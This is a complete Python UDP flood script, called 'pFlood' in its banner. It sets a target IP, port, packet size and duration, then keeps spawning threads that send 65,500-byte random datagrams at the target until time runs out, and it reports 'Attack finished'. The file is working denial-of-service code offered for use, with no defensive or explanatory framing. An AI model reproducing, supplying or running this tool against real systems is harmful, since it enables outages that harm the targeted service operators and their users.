from time import time as gettime
import socket
import threading
import os


# Change these, time is in seconds, packet size is in bytes.
target = {"ip": "0.0.0.0", 
          "port": 80, 
          "packetSize": 65500,
          "time": 10}


# Sender thread, this does the actual work.
class sender(object):
    def __init__(self, su, t, ip, port, size, sock):
        thread = threading.Thread(target=self.run, args=())
        self.startup = su
        self.time = t
        self.ip = ip
        self.port = port
        self.size = size
        self.sock = sock
        thread.start()

    def run(self):
        while True:
          # Sends the data.
          self.sock.sendto(self.size, (self.ip, self.port))
          # Time checker.
          endtime = gettime()
          if (self.startup + self.time) < endtime:
            break


def attack(ip, port, time, size):
    print(f"-=-=-=pFlood=-=-=-\nTARGET: {ip}:{port}\nSIZE: {size}\nTIME: {time}\n-=-=-=Started=-=-=-")

    startup = gettime()
    size = os.urandom(min(65500, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
      try:
        # Keeps attempting to open new threads
        send = sender(startup, time, ip, port, size, sock)
      except:
        pass
      # Time checker.
      endtime = gettime()
      if (startup + time) < endtime:
          break

    print('Attack finished.')

if __name__ == '__main__':
    try:
        attack(target["ip"], target["port"], target["time"], target["packetSize"])
    except KeyboardInterrupt:
        print('Attack stopped.')
